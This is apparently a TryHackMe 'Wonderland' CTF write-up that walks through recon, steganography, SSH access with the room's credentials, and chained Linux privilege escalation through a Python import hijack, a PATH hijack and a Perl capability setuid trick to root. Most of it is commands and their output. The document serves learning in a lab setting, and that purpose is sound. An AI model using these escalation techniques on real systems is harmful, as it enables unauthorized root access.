# 🐇 Wonderland CTF — Writeup

**Author:** Viktor Grozdev · **Date solved:** October 20, 2025  
**Target:** `Wonderland` (TryHackMe) — *educational CTF writeup*

[![TryHackMe](https://img.shields.io/badge/TryHackMe-Labs-blue)]()
[![CTF](https://img.shields.io/badge/CTF-Walkthrough-brightgreen)]()

---

## TL;DR — quick story
I found a Go web server and SSH open. A steganography clue in an image pointed me to a nested directory (`/r/a/b/b/i/t`) and to credentials for the `alice` user. From `alice` I abused a misconfigured `sudo` that runs a Python script as `rabbit`. By hijacking imports and PATH (creating `random.py` and a `date` binary) I escalated to `rabbit`, then to `hatter`, and finally used a capability-aware Perl trick to become `root` and capture the flags. 🎩🔐

---

## Why I liked this room
This room is a nice mix of:
- Web & reconnaissance (hidden directories + steg)  
- SSH + credential discovery  
- Creative local privilege escalation via PATH/import hijacking  
- A final capability-based escalation (Perl)  

It’s great for practicing *thinking like the system* — where scripts trust local files or assume safe PATHs.

---

## Table of contents
- [Recon & discovery](#recon--discovery)  
- [Initial access: `alice`](#initial-access-alice)  
- [From `alice` → `rabbit` (sudo import hijack)](#from-alice--rabbit-sudo-import-hijack)  
- [From `rabbit` → `hatter` (PATH hijack)](#from-rabbit--hatter-path-hijack)  
- [Root escalation](#root-escalation)  
- [Commands (collapsed)](#commands-collapsed)  
- [Artifacts & screenshots](#artifacts--screenshots)  
- [Lessons & next steps](#lessons--next-steps)  
- [References](#references)

---

## Recon & discovery
Started with **nmap**:

nmap -Pn -sC -sV <TARGET-IP>

Output:

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Golang net/http server
HTTP title: Follow the white rabbit.

Directory fuzzing with gobuster:

gobuster dir -u http://<TARGET-IP> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100

Found directories:

/img
/r
/poem

Inside /img:

    alice_door.jpg

    alice_door.png

    white_rabbit_1.jpg

Used StegSeek to extract hidden data:

stegseek white_rabbit_1.jpg
cat white_rabbit_1.jpg.out
# => follow the r a b b i t

The hint pointed towards /r/a/b/b/i/t. Gobuster confirmed the path. The web page source revealed what looked like SSH credentials:

alice:HowDothTheLittleCrocodileImproveHisShiningTail

Initial access — alice

SSH in:

ssh alice@<TARGET-IP>
# password: HowDothTheLittleCrocodileImproveHisShiningTail

Check sudo privileges:

sudo -l

Output:

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

From alice → rabbit (sudo import hijack)

The Python script /home/alice/walrus_and_the_carpenter.py imported a module without a full path. This allowed creating our own module for privilege escalation.

# random.py
import os
os.system("/bin/bash")

Run as rabbit:

sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

Now we have a shell as rabbit.
From rabbit → hatter (PATH hijack)

teaParty.py executed date without specifying the full path. Steps to escalate:

# create fake date binary
cat > date <<'EOF'
#!/bin/bash
/bin/bash
EOF

chmod +x date
export PATH=/home/rabbit:$PATH

Run the script — shell now runs as hatter. Found password:

hatter:WhyIsARavenLikeAWritingDesk?

Root escalation

After logging in as hatter with a clean session, I ran linpeas/LinEnum. Capabilities indicated Perl could escalate privileges.

perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# whoami
root

Flags captured:

    user.txt

    root.txt ✅

Commands (collapsed)
<details> <summary>Click to expand main commands</summary>

# nmap
nmap -Pn -sC -sV <TARGET-IP>

# gobuster
gobuster dir -u http://<TARGET-IP> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100

# steg
stegseek white_rabbit_1.jpg
cat white_rabbit_1.jpg.out

# SSH initial
ssh alice@<TARGET-IP>

# sudo check
sudo -l

# random.py exploit
cat > random.py <<'PY'
import os
os.system("/bin/bash")
PY
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

# date PATH hijack
cat > date <<'SH'
#!/bin/bash
/bin/bash
SH
chmod +x date
export PATH=/home/rabbit:$PATH

# Perl root escalation
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
